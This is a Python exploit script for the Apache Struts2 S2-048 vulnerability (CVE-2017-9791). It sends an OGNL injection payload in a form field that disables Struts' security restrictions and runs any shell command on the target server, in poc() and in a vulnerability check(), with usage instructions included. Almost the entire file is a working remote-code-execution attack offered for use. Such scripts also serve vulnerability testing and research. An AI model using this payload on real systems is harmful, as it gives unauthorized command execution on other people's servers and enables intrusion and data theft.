'''
Created on 2017-7-8
CVE: CVE-2017-9791
@author: DragonEgg and re-written by random_robbie for python3
'''
import sys

def poc(url,cmd):
    import requests
    session = requests.Session()
    paramsPost = {"name":"%{(\x23_='multipart/form-data').(\x23dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(\x23_memberAccess?(\x23_memberAccess=\x23dm):((\x23container=\x23context['com.opensymphony.xwork2.ActionContext.container']).(\x23ognlUtil=\x23container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(\x23ognlUtil.getExcludedPackageNames().clear()).(\x23ognlUtil.getExcludedClasses().clear()).(\x23context.setMemberAccess(\x23dm)))).(\x23cmd='"+cmd+"').(\x23iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(\x23cmds=(\x23iswin?{'cmd.exe','/c',\x23cmd}:{'/bin/bash','-c',\x23cmd})).(\x23p=new java.lang.ProcessBuilder(\x23cmds)).(\x23p.redirectErrorStream(true)).(\x23process=\x23p.start()).(\x23ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(\x23process.getInputStream(),\x23ros)).(\x23ros.flush())}","description":"123","__cheackbox_bustedBefore":"true","age":"123"}
    headers = {"Connection":"close","User-Agent":"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0"}
    response = session.post(url, data=paramsPost, headers=headers ,verify=False)
    print (response.text)




def check(url):
    import requests
    session = requests.Session()
    paramsPost = {"name":"%{(\x23_='multipart/form-data').(\x23dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(\x23_memberAccess?(\x23_memberAccess=\x23dm):((\x23container=\x23context['com.opensymphony.xwork2.ActionContext.container']).(\x23ognlUtil=\x23container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(\x23ognlUtil.getExcludedPackageNames().clear()).(\x23ognlUtil.getExcludedClasses().clear()).(\x23context.setMemberAccess(\x23dm)))).(\x23cmd='echo dragonegg').(\x23iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(\x23cmds=(\x23iswin?{'cmd.exe','/c',\x23cmd}:{'/bin/bash','-c',\x23cmd})).(\x23p=new java.lang.ProcessBuilder(\x23cmds)).(\x23p.redirectErrorStream(true)).(\x23process=\x23p.start()).(\x23ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(\x23process.getInputStream(),\x23ros)).(\x23ros.flush())}","description":"123","__cheackbox_bustedBefore":"true","age":"123"}
    headers = {"Connection":"close","User-Agent":"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0"}
    response = session.post(url, data=paramsPost, headers=headers ,verify=False)
    if 'dragonegg' in response.text:
        print ('s2-048 \033[1;32m EXISTS \033[0m!')
    else:
        print ('s2-048 \033[1;31m NOT EXISTS \033[0m!')


def Usage():
    print ('check:')
    print ('    python file.py http://1.1.1.1/struts2-showcase/integration/saveGangster.action')
    print ('poc:')
    print ('    python file.py http://1.1.1.1/struts2-showcase/integration/saveGangster.action command')
    



if __name__ == '__main__':

    if len(sys.argv) == 2:
        check(sys.argv[1])
        
    elif len(sys.argv) == 3:
        poc(sys.argv[1],sys.argv[2])
        
    else:
        Usage()
        exit()

